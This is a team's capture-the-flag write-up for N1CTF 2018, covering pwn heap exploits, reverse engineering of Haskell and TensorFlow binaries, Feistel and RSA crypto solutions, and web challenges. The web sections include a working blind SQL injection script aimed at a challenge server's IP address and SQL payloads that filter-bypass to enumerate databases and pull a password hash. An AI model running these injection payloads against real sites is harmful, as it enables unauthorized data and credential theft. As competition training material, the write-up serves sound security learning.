# N1CTF 2018


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20180310-n1ctf/) of this writeup.**


 - [N1CTF 2018](#n1ctf-2018)
   - [Pwn](#pwn)
     - [null (kevin47)](#null-kevin47)
     - [memsafety (kevin47)](#memsafety-kevin47)
     - [beeper(4w4rD)](#beeper4w4rd)
     - [vote (how2hack)](#vote-how2hack)
   - [Rev](#rev)
     - [patience (sces60107)](#patience-sces60107)
     - [baby neural network (sasdf)](#baby-neural-network-sasdf)
       - [Entry](#entry)
       - [Dig into](#dig-into)
       - [Flag???](#flag)
   - [Web](#web)
     - [77777 (sasdf, bookgin)](#77777-sasdf-bookgin)
     - [77777 2 (bookgin) unsolved](#77777-2-bookgin-unsolved)
     - [babysqli (bookgin) unsolved](#babysqli-bookgin-unsolved)
   - [Crypto](#crypto)
     - [baby_N1ES (shw)](#baby_n1es-shw)
     - [rsa_padding (shw)](#rsa_padding-shw)
   - [PPC](#ppc)
     - [losetome (how2hack)](#losetome-how2hack)
   - [Misc](#misc)



## Pwn

### null (kevin47)
> ELF 64-bit, stripped, Canary and NX enabled, Full RELRO, No PIE
> 結果這題根本超簡單QQ
* arbitrary malloc with no free
* overflow in read
* using thread
* function pointer in 0x602038

After the first malloc, the mapped address space will look like:
```
    Start Addr         End Addr       Size  Offset 
...
     0x20c6000        0x20e7000    0x21000  0x0 [heap]
0x7f7b60000000   0x7f7b60021000    0x21000  0x0 <- thread arena
0x7f7b60021000   0x7f7b64000000  0x3fdf000  0x0 <- space for malloc
0x7f7b6714c000   0x7f7b6714d000     0x1000  0x0 
0x7f7b6714d000   0x7f7b6794d000   0x800000  0x0 
0x7f7b6794d000   0x7f7b67b0d000   0x1c0000  0x0 /lib/x86_64-linux-gnu/libc-2.23.so
...

```
Our goal is to overwrite thread arena with overflow, so we need a chunk of memory before the thread arena. Achive this by spamming malloc. After filling the space, new mapped address space will look like:
```
    Start Addr         End Addr       Size  Offset 
...
     0x20c6000        0x20e7000    0x21000  0x0 [heap]
0x7f7b58000000   0x7f7b60000000  0x8000000  0x0 <- new mapped space
0x7f7b60000000   0x7f7b63ffd000  0x3ffd000  0x0 <- thread arena
0x7f7b63ffd000   0x7f7b64000000     0x3000  0x0 <- filled space
0x7f7b6714c000   0x7f7b6714d000     0x1000  0x0 
0x7f7b6714d000   0x7f7b6794d000   0x800000  0x0 
0x7f7b6794d000   0x7f7b67b0d000   0x1c0000  0x0 /lib/x86_64-linux-gnu/libc-2.23.so
...
```
Bang! the new space will be before the thread arena! Just fill it again so that we can control the end near 0x7f7b60000000.

Thread arenas' structure are similar (may be equal) to the main arena, they both has fastbins.

We overwrite the fastbin of size 0x70 to 0x60201d, just before the function pointer. Overwrite the pointer to system@PLT and get shell :)

### memsafety (kevin47)
> ELF 64-bit, stripped, no canary found, NX and PIE enabled, partial RELRO
> Rust 題，source code 1000 行，我不一定看得完 (￣▽￣)
* Rust checks array boundary in runtime, so it needs no canary

### beeper(4w4rD)
> ELF 64-bit, stripped, canary NX PIE enabled, partial RELRO
> brain fuck
* predictable mmap address:
    The process would mmap an readable, writeable, executeable space. The address is create by rand() with srand(time(0)), so it is predictable.We can write shellcode on it, and there is a function pointer that already point to it.
* brain-fuck  like interpreter:
    There is an interpreter that can interpret a language similar as brain fuck, and it always take the command on the .data section
* password:
    Password is constant and can be known by reversing, but before checking the input password the interpret would execute and change the input passwrd.
* BOF:
    The input password can be overflowed, and we can change the command that the interpreter execute. We can overwrite command with NULL, so the interpret will not do anything.
* write shellcode:
    Login again, and we can use brain-fuck like language to write shell code on mmap address.Then we can trigger fuction pointer to get shell.

### vote (how2hack)
> ELF 64-bit, stripped, Canary and NX enabled, partial RELRO
* Data structure:
    * Number of votes (8 bytes, uncontrollable)
    * Last voting time (8 bytes, uncontrollable)
    * Name (malloc size, controllable)
* Binary with 5 functions:
    * Create: malloc size 1~4096, then input data
    * Show: show the data infos (votes, time, name)
    * Vote: Not important
    * Result: Not important
    * Cancel: free a chunk
* Vulnerabilities:
    * Use-after-free:
        * Freed chunk doesn't set to NULL
        * Use show() to leak FD and BK (libc address)
    * Double Free:
        * Fastbin corruption attack
* Exploit:
    * Forging fake fastbin (Q is UAF) :
        ![vote1](https://imgur.com/u49MzKQ.jpg)
        
        ![vote2](https://imgur.com/Gyjma2C.jpg)
        
        ![vote3](https://imgur.com/PXc4KZy.jpg)
        
        ![vote4](https://imgur.com/R5l6TlY.jpg)
        
        ![vote5](https://imgur.com/Ne0nVvx.jpg)
        
    * Overwrite pthread_create to one_gadget and get shell!
* Flag:
    * `N1CTF{Pr1nTf_2333333333!}`

## Rev

### patience (sces60107)

In this challenge, we will be given one binary and one cmm file.

The binary will print flag very slowly. So we must figure out the algorithm in this binary.

But IDA pro is not working on this binary. 

After some googling I found that cmm file is related to [haskell compiler]()

Fortunately, the cmm file is somehow human-readable.

With some guessing I summerize some pseudo classes.

```python
def s0():
    return  [97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,48,49,50,51,52,53,54,55,56,57,33,35,36,37,38,39,34,40,41,42,43,44,45,46,47,58,59,60,61,62,63,64,91,92,93,94,95,96,123,124,125,126]


def s1():
    return [49,118,73,123,101,91,56,84,100,93,45,110,81,46,55,79,34,98,108,40,106,113,64,60,48,86,121,38,90,51,126,92,112,115,44,97,68,94,59,66,78,57,74,85,111,104,124,67,69,50,95,54,33,71,39,114,72,117,102,62,36,83,37,77,120,103,122,75,89,52,96,99,43,87,88,65,53,70,41,109,82,125,35,80,116,76,63,42,61,105,47,58,119,107]


def s2():
    return [66,112,125,105,123,88,85,37,102,36,68,82,92,48,60,76,120,61,111,34,83,108,96,98,122,41,45,101,54,50,124,38,74,113,70,84,33,40,67,53,121,104,59,64,117,42,46,87,97,90,35,81,118,44,63,99,114,56,119,69,109,52,95,116,49,57,80,72,58,106,93,62,91,78,86,77,110,55,89,71,107,75,39,94,47,126,79,73,100,115,65,43,51,103]


def s3():
    return [95,114,43,35,121,104,91,89,41,83,56,97,88,74,119,86,38,106,118,34,111,61,73,40,54,62,112,103,44,102,45,77,93,113,98,78,52,39,69,68,75,70,92,116,60,51,71,37,124,36,99,115,80,81,109,125,126,48,64,82,59,117,85,50,122,57,105,87,66,46,47,72,67,107,33,123,58,79,100,94,90,84,55,96,65,110,108,49,101,53,76,42,120,63]

    
```

And I also find out that there is some global constant which seems related to flag.

```
[section ""data" . dt_r33R_closure" {
     dt_r33R_closure:
         const GHC.Types.I#_con_info;
         const 0;
 }]



==================== Output Cmm ====================
[section ""data" . dt1_r36n_closure" {
     dt1_r36n_closure:
         const GHC.Types.I#_con_info;
         const 39;
 }]



==================== Output Cmm ====================
[section ""data" . flags1_r36o_closure" {
     flags1_r36o_closure:
         const Main.Index_con_info;
         const dt_r33R_closure+1;
         const dt1_r36n_closure+1;
         const 3;
 }]



==================== Output Cmm ====================
[section ""data" . dt2_r36p_closure" {
     dt2_r36p_closure:
         const GHC.Types.I#_con_info;
         const 5;
 }]



==================== Output Cmm ====================
[section ""data" . dt3_r36q_closure" {
     dt3_r36q_closure:
         const GHC.Types.I#_con_info;
         const 282;
 }]



==================== Output Cmm ====================
[section ""data" . flags2_r36r_closure" {
     flags2_r36r_closure:
         const Main.Index_con_info;
         const dt2_r36p_closure+1;
         const dt3_r36q_closure+1;
         const 3;
 }]


```

Each byte of flag is defined by two number.

We know the first byte is 'N' and the s0_closure()[39] is also 'N'. I thought it's not a coincidence.

So I suppose that the second number is index value.

Now what about the first number?

After some testing and brainstorming.

I figure out the complete algorithm

```python
def foo(n):
    if n==0:
        return s0()
    else:
        return s1()+foo(n-1)+s2()+foo(n-1)+s3()
        
flag = [[0,39],[5,282],....]

for i in flag:
    print foo(i[0])[i[1]]

```
Finally,
The flag is `N1CTF{did_cmm_helped?1109ef6af4b2c6fc274ddc16ff8365d1}
` 






[haskell]: https://ghc.haskell.org/trac/ghc/wiki/Commentary/Rts/Cmm

### baby neural network (sasdf)

Just like common c++ reverse challenge with complex libraries, decompiled code is full of garbage. There are about 1300 lines in `main`.
#### Entry
First thing to do is to find our objective.
```C++
do
{
    v106 = *(v7 + v104);
    *&v106.m128_u64[0] = *&v106.m128_u64[0] - *(v7 + 5796584);
    v106.m128_f32[0] = *&v106.m128_u64[0];
    if ( COERCE_FLOAT(_mm_and_ps(v106, xmmword_247E300)) > 1.0e-10 )
    {
        std::operator<<<std::char_traits<char>>(&std::cout, "Incorrect flag :(");
        goto LABEL_197;
    }
    v7 = v7 + 8;
}
while ( v7 != 328 );
std::operator<<<std::char_traits<char>>(
        &std::cout,
        "Congratulations! Your flag is absolutely correct.");
```
Looks like we need to make something equals to zero. However, IDA decompilied it incorrectly.
```asm
call     tensorflow::Tensor::shaped<double,1ul>(tensorflow::gtl::ArraySlice<long long>)
movsd    xmm0, qword ptr [rbx+rax]
subsd    xmm0, predictions[rbx]
cvtsd2ss xmm0, xmm0
andps    xmm0, cs:xmmword_247E300
cvtss2sd xmm0, xmm0
ucomisd  xmm0, cs:qword_247CE48
jbe      short loc_448A26
mov      esi, offset aIncorrectFlag ; "Incorrect flag :("
```
It subtracts a Tensor with `predictions`, and check if it equals to zero. Our objective is to make this Tensor equals to `predictions`.


#### Dig into
To figure out what the program is, just ignore everything drives you crazy.  

At the top of main, there's some check telling us the input has length of 41.
```C++
if ( argc != 2 )
{
    std::operator<<<std::char_traits<char>>(&std::cout, "Please supply your input");
    goto LABEL_6;
}
input = argv[1];
inputLen = -1LL;
/* do ... while */
if ( inputLen == -43 ) // in fact, it's checking length == 41
```

After remove all garbages, the code looks more friendly:
```C++
tensorflow::TensorShapeBase::TensorShapeBase(&_placeholder, &shape_1_41, 2LL);
tensorflow::ops::Placeholder::Placeholder(&placeholder, &scope, 2LL, v10);
tensorflow::TensorShapeBase::TensorShapeBase(v10, &_733, 2LL); // _733 = {1, 41}
tensorFromArray(&bias1, 2LL, &bias_layer1, 328LL, v10); // 1 * 41 * 8 = 328
/* ... from 1 to 5 ... */
tensorflow::TensorShapeBase::TensorShapeBase(v10, &_738, 2LL); // _738 = {41, 41}
tensorFromArray(&w1, 2LL, &weights_layer1, 13448LL, v10); // 41 * 41 * 8 = 13448
/* ... from 1 to 5 ... */
tensorflow::TensorShapeBase::TensorShapeBase(v10, &_743, 2LL); // _743 = {1, 41}
tensorFromArray(&pred, 2LL, &predictions, 328LL, v10);

tensorflow::Tensor::Tensor(&_bias1, &bias1);
tensorflow::Tensor::Tensor(&_w1, &w1);
tensorflow::ops::MatMul::MatMul(&v180, &scope, &_placeholder, v10);
tensorflow::ops::Add::Add(&v184, &scope, &v249, v3);
tensorflow::ops::Sigmoid::Sigmoid(&v188, &scope, &v239);

tensorflow::Tensor::Tensor(v10, &bias2);
tensorflow::Tensor::Tensor(&_placeholder, &w2);
forwardPass(&v164, &scope, &v199, &_placeholder, v10);
/* ... from 2 to 5 ... */

tensorflow::ClientSession::ClientSession(&sess, &scope);
tensorflow::ClientSession::Run(&v188, &sess, &v192, &v142, &v139);
```
It looks like a 5-layer DNN with sigmoid as activation function. For people who isn't familiar with Deeeeeep learning, Here's math notation:
$$
v_0 := input\\
v_5 := output\\
v_i = sigmoid\left(v_{i-1} W_i + b_i\right)\\
sigmoid(x) = \frac{1}{1+e^{-x}}
$$
and the inverse is:
$$
sigmoid^{-1}(x) = - log\left(\frac{1}{x} - 1\right)\\
v_{i-1} = \left(sigmoid^{-1}(v_i) - b_i\right) W_i^{-1}
$$
we will get the flag after calculating the inverse for all layers:
```
[0.0128232  0.02040983 0.01491556 0.01190851 0.01428702 ... ]
```
... not the flag :(

#### Flag???
Tracing along the path about how input string goes into neural network:
```C++
_input = _argv[1];
for ( i = 0LL; ; i = v69++ )
{
    *&v198[8 * v69 - 8] = 1.0 / _input[i];
    if ( v69 == 41 )
        break;
}
tensorflow::TensorShapeBase::TensorShapeBase(v10, &_744, 2LL); // _744 = {1, 41}
tensorFromArray(&v234, 2LL, v198, 328LL, v10); // 328 = 1 * 41 * 8
```
flag is multicative inverse of previous result :)
`N1CTF{N3ural_Network_1s_Really_Fantastic}`

## Web

### 77777 (sasdf, bookgin)
```php
sprintf("UPDATE users SET points=%d%s", $_POST['flag'], waf($_POST['hi']);
```
- `substring` is WAFed, but `substr` is not.
- Get length: hi=`9453 where LENGTH(password)>14 and LENGTH(password)<16`
  `=` is filtered by WAF.
- Get password: hi=`9453 where md5("a") like md5(substr(password, 1, 1))`

```python
#!/usr/bin/env python3
import requests, string, re

def flush():
    data = dict(flag='',hi='1234')
    requests.post('http://47.75.14.48', data=data)

def guess(s):
    data = dict(
        flag='',
        hi=f'9453 where md5("{s}") like md5(substr(password, 1, {len(s)}))',
    )
    response = requests.post('http://47.75.14.48', data=data).text
    result = re.search('My Points.*<br/>', response)
    return (result is not None and '9453' in result.group(0))

def guessNext(prefix):
    for i in string.printable:
        flush()
        print(prefix, i)
        if guess(prefix + i):
            return prefix + i
    raise RuntimeError(pwd, 'next char not found')

pwd=''
while len(pwd) != 15:
    pwd = guessNext(pwd)
```

[Someone](https://github.com/rkmylo/ctf-write-ups/blob/master/2018-n1ctf/web/77777-104/solve.py) provides this shorter payload `ord(substr(password,INDEX,1))

### 77777 2 (bookgin) unsolved
- The column name `pw` is WAFed, but in fact it just **did not allow the `pw` keyword to be prefixed or followed by any characters apart from whitespaces**.  (why....?)
- `where` is WAFed.
- Not WAFed: `substr select from if & *`
- Payload: `convert(hex(substr( pw ,1 ,1)),signed)`

Reference: 
- https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/77777-2-208
- https://delcoding.github.io/2018/03/n1ctf-writeup/

### babysqli (bookgin) unsolved

sql injection 的點是使用者大頭照，有 `1.png` & `2.png`，但 `information` 被 WAF，所以不好取得 database_name

Payload 1: 
```sql
'or((select(substr((select(user())),<GUESS_INDEX>,1))='<GUESS_CHAR>')=1)#`
```

Payload 2:
```sql
'=if(ascii(substring((select(group_concat(database_name))from(mysql.innodb_table_stats)),%d,1))>%d,1,0)='
```
- 然後拿到 database `sys，mysql，n1ctf_2018_venenof7`
- `n1ctf_2018_venenof7` 有`vimg,vusers` 兩張 tables
- `vusers` 有個 column 叫 `password` ，跑出来`ac895b772a4ec1eff81e07aa2907afe3`

拿去主辦官方的網頁做 md5 decrypt 噴 flag


Reference: 
- http://www.bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/
- https://github.com/Nu1LCTF/n1ctf-2018/blob/master/writeups/web/babysqli.md
- http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/


## Crypto
### baby_N1ES (shw)
We are given the source code of encryption and a ciphertext.
```python
def encrypt(self, plaintext):
    if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False):
        raise Exception("plaintext must be a multiple of 16 in length")
    res = ''
    for i in range(len(plaintext) / 16):
        block = plaintext[i * 16:(i + 1) * 16]
        L = block[:8]
        R = block[8:]
        for round_cnt in range(32):
            L, R = R, (round_add(L, self.Kn[round_cnt]))
        L, R = R, L
        res += L + R
    return res
```
And the function `round_add()`:
```python
def round_add(a, b):
    f = lambda x, y: x + y - 2 * (x & y)
    res = ''
    for i in range(len(a)):
        res += chr(f(ord(a[i]), ord(b[i])))
    return res
```
Note that if `m = round_add(a, b)`, then `a = round_add(m, b)`, and also it is a Feistel cipher. Thus, we can decrypt the ciphertext by simply reversing the key schedule.
```python
from N1ES import N1ES
import base64

key = "wxy191iss00000000000cute"
n1es = N1ES(key)
c = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx'

n1es.Kn = n1es.Kn[::-1]
print n1es.encrypt(base64.b64decode(c))
```
FLAG: `N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/}`
### rsa_padding (shw)
We are given the source code of encryption, where `m` contains the flag, and `e = 3`.
```python
mm = bytes_to_long(m)
assert pow(mm, e) != pow(mm, e, n)
sys.stdout.write("Please give me a padding: ")
padding = input().strip()
padding = int(sha256(padding.encode()).hexdigest(),16)
c = pow(mm+padding, e, n)
print("Your Ciphertext is: %s"%c)
```
Some [write-ups](https://github.com/p4-team/ctf/tree/master/2018-03-10-n1ctf/crypto_rsapadding) point out that this encryption is vulnerable to [*Franklin-Reiter related-message attack*](https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Franklin-Reiter_related-message_attack). Simply speaking, the congruence equation $c \equiv (m + p)^3\ \mathrm{mod}\ n$ can be reduced to a linear congruence equation of $m$ and be solved easily, if we have at least three pairs of $(p, c)$.
Then, we get m = `Welcom to Nu1L CTF, Congratulations, You get flag, and flag is N1CTF{f7efbf4e5f5ef78ca1fb9c8f5eb02635}`.

## PPC

### losetome (how2hack)
I dunno... just try to lose Reversi against AI =w=
FLAG: `N1CTF{Oh!you_1ose_t0_AI_hhhhhh}`

## Misc

